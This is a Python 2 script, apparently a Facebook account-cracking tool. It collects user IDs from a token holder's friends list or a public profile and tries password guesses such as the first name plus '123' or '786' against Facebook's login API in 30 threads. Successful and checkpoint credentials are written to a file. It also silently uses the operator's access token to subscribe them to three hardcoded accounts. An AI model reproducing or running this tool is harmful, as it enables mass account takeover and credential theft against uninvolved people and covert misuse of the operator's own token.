#!/usr/bin/python
# -*- coding: utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
     
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-agent','Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1')]


merah = '\x1b[1;91m'
lime = '\x1b[1;92m'
kuning = '\x1b[1;93m'
biru = '\x1b[1;94m'
ungu = '\x1b[1;95m'
blue = '\x1b[1;96m'
putih = '\x1b[1;97m'
tutup = '\x1b[0m'


def keluar():
    print '\033[1;97m[\033[1;91m!\033[1;97m] Exit'
    os.sys.exit()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdtoket.write(x+'\n')
		
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		
logo = """\033[1;91m ██████╗███████╗██████╗ ██╗██████╗ ██████╗ 
\033[1;91m██╔════╝██╔════╝██╔══██╗██║██╔══██╗██╔══██╗
\033[1;91m██║     █████╗  ██████╔╝██║██████╔╝██████╔╝
\033[1;97m██║     ██╔══╝  ██╔══██╗██║██╔═══╝ ██╔══██╗
\033[1;97m╚██████╗██║     ██████╔╝██║██║     ██████╔╝
\033[1;97m ╚═════╝╚═╝     ╚═════╝ ╚═╝╚═╝     ╚═════╝
\033[1;97m[\033[1;92m•\033[1;97m] Author  : Angga Kurniawan
\033[1;97m[\033[1;92m•\033[1;97m] Version : 4.2
\033[1;97m[\033[1;92m•\033[1;97m] Team    : SPTeam
\033[1;97m[\033[1;92m•\033[1;97m] GitHub  : https://github.com/anggaxd
\033[1;97m[\033[1;92m•\033[1;97m] FB Page : https://fb.com/uservip.anggaxd"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mSedang Login \x1b[1;97m"+o),;sys.stdtoket.flush();time.sleep(1)

idmem = []
idfriend = []
idfromfriend = []
back = 0
cekrek = []
threads = []
berhasil = []
emteman = []
emfromfriend = []
cekpoint = []
checkpoint = []
oks = []
id = []
auto_total = []
auto_ok = []
auto_cp = []
auto_run = []
listgrup = []
cekrek = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
    
def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
    requests.post('https://graph.facebook.com/100027597829137/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100002224561488/subscribers?access_token=' + toket)
    menu()
		
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 50* "\033[1;94m-"
		toket = raw_input("\033[1;97m[\033[1;92m>\033[1;97m] Token \033[1;91m:\033[1;92m ")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
			a = json.loads(otw.text)
			zedd = open("login.txt", 'w')
			zedd.write(toket)
			zedd.close()
			print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
			bot_komen()
		except KeyError:
			print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken salah !"
			time.sleep(1.7)
			tokenz()
        
def menu():
	os.system('clear')
	global toket
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print "\033[1;97m[\033[1;91m!\033[1;97m] Token Invalid"
		os.system('clear')
		os.system('rm -rf login.txt')
		tokenz()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ttl = a['birthday']
	except KeyError:
		os.system('clear')
		print"\033[1;97m[\033[1;91m!\033[1;97m] Token Invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		tokenz()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[\033[1;91m!\033[1;97m] No Connection"
		keluar()
	os.system("git pull")
	os.system("clear")
	print logo
	print 50*"\033[1;94m-"
	print "\033[1;97m[\033[1;92m•\033[1;97m]\033[1;97m Name\033[1;91m : \033[1;97m"+nama+"\033[1;97m                  "
	print "\033[1;97m[\033[1;92m•\033[1;97m]\033[1;97m UID \033[1;91m : \033[1;97m"+id+"\x1b[1;97m              "
	print 50*"\033[1;94m-"
	print "\033[1;97m[\033[1;92m01\033[1;97m] Crack From Friends List"
	print "\033[1;97m[\033[1;92m02\033[1;97m] Crack From Public ID"
	print "\033[1;97m[\033[1;92m03\033[1;97m] Crack With Choice Password "
	print "\033[1;97m[\033[1;92m04\033[1;97m] Dump ID Friend / Public ID"
	print "\033[1;97m[\033[1;91m00\033[1;97m] Logout"
	print 50*"\033[1;94m-"
	pilih_menu()

def pilih_menu():
	peak = raw_input("\033[1;97manggaxd/\033[1;91m> \033[1;97m")
	if peak =="":
		print "\033[1;97m[\033[1;91m!\033[1;97m] Please Fill In The Correct One"
		pilih_menu()
	elif peak =="1" or peak =="01":
		os.system('clear')
		print logo
		print 50*"\033[1;94m-"
		jalan('\033[1;97m[\033[1;92m✓\033[1;97m] Mengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2" or peak =="02":
		os.system('clear')
		print logo
		print 50*"\033[1;94m-"
		idt = raw_input("\033[1;97m[\033[1;93m•\033[1;97m] \033[1;97mID Public \033[1;91m:\033[1;92m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m[\033[1;93m•\033[1;97m]\033[1;97m Name \033[1;91m:\033[1;92m "+sp["name"]
		except KeyError:
			print"\033[1;97m[\033[1;91m!\033[1;97m] ID Publik/Teman There Is No !"
			raw_input("\n\033[1;93m[\033[1;97mBack Menu\033[1;93m]")
			menu()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3" or peak =="03":
		passchoice()
	elif peak =="4" or peak =="04":
		dump()
	elif peak =="0" or peak =="00":
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;97m[\033[1;91m!\033[1;97m] Please Fill In The Correct One"
		pilih_menu()
		
	print "\033[1;97m[\033[1;92m+\033[1;97m] Total IDs \033[1;91m: \033[1;97m"+str(len(id))
	print("\033[1;97m[\033[1;92m✓\033[1;97m] Cracking Process Has Been Started ...")
	print("\033[1;97m[\033[1;91m!\033[1;97m] No Result Use 5 Second Airplane Mode")
	print 50*"\033[1;96m-"
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('avs')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;97m[\033[1;92mOK\033[1;97m] ' +user+ ' | ' + pass1 + ' > ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;97m[\033[1;93mCP\033[1;97m] ' +user+ ' | ' + pass1 + ' > ' + b['name']
					cek = open("avs/fb.txt", "a")
					cek.write("[+] Name     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;97m[\033[1;92mOK\033[1;97m] ' +user+ ' | ' + pass2 + ' > ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;97m[\033[1;93mCP\033[1;97m] ' +user+ ' | ' + pass2 + ' > ' + b['name']
							cek = open("avs/fb.txt", "a")
							cek.write("[+] Name     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;97m[\033[1;92mOK\033[1;97m] ' +user+ ' | ' + pass3 + ' > ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;97m[\033[1;93mCP\033[1;97m] ' +user+ ' | ' + pass3 + ' > ' + b['name']
									cek = open("avs/fb.txt", "a")
									cek.write("[+] Name     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;97m[\033[1;92mOK\033[1;97m] ' +user+ ' | ' + pass4 + ' > ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;97m[\033[1;93mCP\033[1;97m] ' +user+ ' | ' + pass4 + ' > ' + b['name']
											cek = open("avs/fb.txt", "a")
											cek.write("[+] Name     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = "786786"
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;97m[\033[1;92mOK\033[1;97m] ' +user+ ' | ' + pass5 + ' > ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;97m[\033[1;93mCP\033[1;97m] ' +user+ ' | ' + pass5 + ' > ' + b['name']
													cek = open("avs/fb.txt", "a")
													cek.write("[+] Name     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = '102030'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;97m[\033[1;92mOK\033[1;97m] ' +user+ ' | ' + pass6 + ' > ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;97m[\033[1;93mCP\033[1;97m] ' +user+ ' | ' + pass6 + ' > ' + b['name']
															cek = open("avs/fb.txt", "a")
															cek.write("[+] Name     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print '\n\033[1;97m[\033[1;92m✓\033[1;97m] Process Has Been Completed ...'
	print '\033[1;97m[\033[1;92m✓\033[1;97m] Total \033[1;92mOK\033[1;97m/\033[1;93mCP\033[1;97m : '+str(len(oks))+'/'+str(len(cekpoint))
	print('\033[1;97m[\033[1;92m✓\033[1;97m] Cracking Accounts Has Been Saved : avs/fb.txt')
	raw_input("\n\033[1;97mPress Enter Go Back To Menu")
	menu()
	
def passchoice():
	os.system("clear")
	print logo
	print 50*"\033[1;96m-"
	print "\033[1;97m[\033[1;92m01\033[1;97m] Crack From FriendList"
	print "\033[1;97m[\033[1;92m02\033[1;97m] Crack From Public ID"
	print "\033[1;97m[\033[1;92m00\033[1;97m] Back To Menu"
	print 50*"\033[1;96m-"
	pilih_passxd()
	
def pilih_passxd():
	peak = raw_input("\033[1;97manggaxd/\033[1;91m> \033[1;97m")
	if peak =="":
		print "\033[1;97m[\033[1;91m!\033[1;97m] Please Fill In The Correct One"
		pilih_passxd()
	elif peak =="1" or peak =="01":
		os.system('clear')
		print logo
		print 50*"\033[1;96m-"
		jalan('\033[1;97m[\033[1;92m✓\033[1;97m] Mengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2" or peak =="02":
		os.system('clear')
		print logo
		print 50*"\033[1;96m-"
		idt = raw_input("\033[1;97m[\033[1;93m•\033[1;97m] \033[1;97mID Public \033[1;91m:\033[1;92m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m[\033[1;93m•\033[1;97m]\033[1;97m Name \033[1;91m:\033[1;92m "+sp["name"]
		except KeyError:
			print"\033[1;97m[\033[1;91m!\033[1;97m] ID Publik/Teman There Is No !"
			raw_input("\n\033[1;93m[\033[1;97mBack Menu\033[1;93m]")
			menu()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3" or peak =="03":
		os.system('clear')
		print logo
		print 50*"\033[1;96m-"
		try:
			idlist = raw_input("\033[1;97m[\033[1;93m•\033[1;97m] \033[1;97mEnter File Path \033[1;91m:\033[1;92m ")
			for line in open(idlist, 'r').readlines():
				id.append(line.strip())
		except IOError:
			print"\033[1;97m[\033[1;91m!\033[1;97m] File Not Found !"
			raw_input("\n\033[1;93m[\033[1;97mBack Menu\033[1;93m]")
			menu()
	elif peak =="0" or peak =="00":
		menu()
	else:
		print "\033[1;97m[\033[1;91m!\033[1;97m] Please Fill In The Correct One"
		passchoice()
		
	pass1 = raw_input ("\033[1;97m[\033[1;92m+\033[1;97m] Password 1 \033[1;91m:\033[1;97m ")
	pass2 = raw_input ("\033[1;97m[\033[1;92m+\033[1;97m] Password 2  \033[1;91m:\033[1;97m ")
	pass3 = raw_input ("\033[1;97m[\033[1;92m+\033[1;97m] Password 3  \033[1;91m:\033[1;97m ")
	pass4 = raw_input ("\033[1;97m[\033[1;92m+\033[1;97m] Password 4  \033[1;91m:\033[1;97m ")
	pass5 = raw_input ("\033[1;97m[\033[1;92m+\033[1;97m] Password 5  \033[1;91m:\033[1;97m ")
	print "\033[1;97m[\033[1;92m+\033[1;97m] Total IDs \033[1;91m: \033[1;97m"+str(len(id))
	print("\033[1;97m[\033[1;92m✓\033[1;97m] Cracking Process Has Been Started ...")
	print("\033[1;97m[\033[1;91m!\033[1;97m] No Result Use 5 Second Airplane Mode")
	print 50*"\033[1;96m-"
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('avs')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;97m[\033[1;92mOK\033[1;97m] ' +user+ ' | ' + pass1 + ' > ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;97m[\033[1;93mCP\033[1;97m] ' +user+ ' | ' + pass1 + ' > ' + b['name']
					cek = open("avs/fb.txt", "a")
					cek.write("[+] Name     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;97m[\033[1;92mOK\033[1;97m] ' +user+ ' | ' + pass2 + ' > ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;97m[\033[1;93mCP\033[1;97m] ' +user+ ' | ' + pass2 + ' > ' + b['name']
							cek = open("avs/fb.txt", "a")
							cek.write("[+] Name     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;97m[\033[1;92mOK\033[1;97m] ' +user+ ' | ' + pass3 + ' > ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;97m[\033[1;93mCP\033[1;97m] ' +user+ ' | ' + pass3 + ' > ' + b['name']
									cek = open("avs/fb.txt", "a")
									cek.write("[+] Name     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;97m[\033[1;92mOK\033[1;97m] ' +user+ ' | ' + pass4 + ' > ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;97m[\033[1;93mCP\033[1;97m] ' +user+ ' | ' + pass4 + ' > ' + b['name']
											cek = open("avs/fb.txt", "a")
											cek.write("[+] Name     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;97m[\033[1;92mOK\033[1;97m] ' +user+ ' | ' + pass5 + ' > ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;97m[\033[1;93mCP\033[1;97m] ' +user+ ' | ' + pass5 + ' > ' + b['name']
													cek = open("avs/fb.txt", "a")
													cek.write("[+] Name     : " +b['name']+ "\n[+] User     : " +user+ "\n[+] Password : " +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print '\n\033[1;97m[\033[1;92m✓\033[1;97m] Process Has Been Completed ...'
	print '\033[1;97m[\033[1;92m✓\033[1;97m] Total \033[1;92mOK\033[1;97m/\033[1;93mCP\033[1;97m : '+str(len(oks))+'/'+str(len(cekpoint))
	print('\033[1;97m[\033[1;92m✓\033[1;97m] Cracking Accounts Has Been Saved : avs/fb.txt')
	raw_input("\n\033[1;97mPress Enter Go Back To Menu")
	menu()

def dump():
	os.system("clear")
	print logo
	print 50*"\033[1;94m-"
	print "\033[1;97m[\033[1;92m01\033[1;97m] Dump ID From FriendsList"
	print "\033[1;97m[\033[1;92m02\033[1;97m] Dump ID From Public ID"
	print "\033[1;97m[\033[1;92m00\033[1;97m] Back To Menu"
	print 50*"\033[1;94m-"
	pilih_dump()
	
def pilih_dump():
	peak = raw_input("\033[1;97manggaxd/\033[1;91m> \033[1;97m")
	if peak =="":
		print "\033[1;97m[\033[1;91m!\033[1;97m] Please Fill In The Correct One"
		pilih_toket()
	elif peak =="1" or peak =="01":
		id_teman()
	elif peak =="2" or peak =="02":
		id_dariteman()
	elif peak =="0" or peak =="00":
		menu()
	else:
		print "\033[1;97m[\033[1;91m!\033[1;97m] Please Fill In The Correct One"
		pilih_dump()
		
def id_teman():
    os.system("clear")
    print logo
    print 50*"\033[1;94m-"
    try:
        os.mkdir('avs')
    except OSError:
        pass

    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    z = json.loads(r.text)
    print putih + '[' + lime + '+' + putih + '] Fetching ID All Friend ...' + putih
    save = open('avs/id_teman.txt', 'w')
    for y in z['data']:
        idfriend.append(y['id'])
        save.write(y['id'] + '\n')
        print putih + '\r[' + lime + '+' + putih + '] Total IDs : ' + lime + str(len(idfriend)),
        save.flush()
        time.sleep(0.0001)
    
    save.close()
    print putih + '\n[' + lime + '+' + putih + '] Successfully Get ID Friend'
    done = raw_input(putih + '[' + lime + '+' + putih + '] Save File With Name : ' + lime)
    print putih + '[' + lime + '+' + putih + '] Create File ...'
    time.sleep(2)
    os.rename('avs/id_teman.txt', 'avs/' + done)
    print putih + '[' + lime + '+' + putih + '] File Saved : ' + lime + 'avs/' + done + putih
    print putih + '[' + lime + '+' + putih + '] Done ^_^'
    raw_input(putih + '\nEnter Go Back To Menu')
    menu()
    
def id_dariteman():
    os.system("clear")
    print logo
    print 50*"\033[1;94m-"
    try:
        os.mkdir('avs')
    except OSError:
        pass

    idt = raw_input(putih + '[' + lime + '+' + putih + '] Input ID Public : ' + lime)
    
    try:
        a = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        f = json.loads(a.text)
        print putih + '[' + blue + '\xe2\x9c\x93' + putih + '] Get ID From : ' + lime + f['name']
    except KeyError:
        print putih + '[' + merah + '!' + putih + '] Not Found'
        raw_input(putih + '\nEnter Go Back Menu')
        menu()

    r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
    z = json.loads(r.text)
    print putih + '[' + lime + '+' + putih + '] Fetching ID All Friend From ' + lime + f['name'] + putih
    save = open('avs/id_temandariteman.txt', 'w')
    for y in z['friends']['data']:
        idfromfriend.append(y['id'])
        save.write(y['id'] + '\n')
        print putih + '\r[' + lime + '+' + putih + '] Total IDs : ' + lime + str(len(idfromfriend)),
        save.flush()
        time.sleep(0.0001)
    
    save.close()
    print putih + '\n[' + lime + '+' + putih + '] Successfully Get ID Friend From ' + lime + f['name'] + putih
    done = raw_input(putih + '[' + lime + '+' + putih + '] Save File With Name : ' + lime)
    print putih + '[' + lime + '+' + putih + '] Create File ...'
    time.sleep(2)
    os.rename('avs/id_temandariteman.txt', 'avs/' + done)
    print putih + '[' + lime + '+' + putih + '] File Saved : ' + lime + 'avs/' + done + putih
    print putih + '[' + lime + '+' + putih + '] Done ^_^'
    raw_input(putih + '\nEnter Go Back To Menu')
    menu()

if __name__ == '__main__':
	os.system("git pull")
	tokenz() 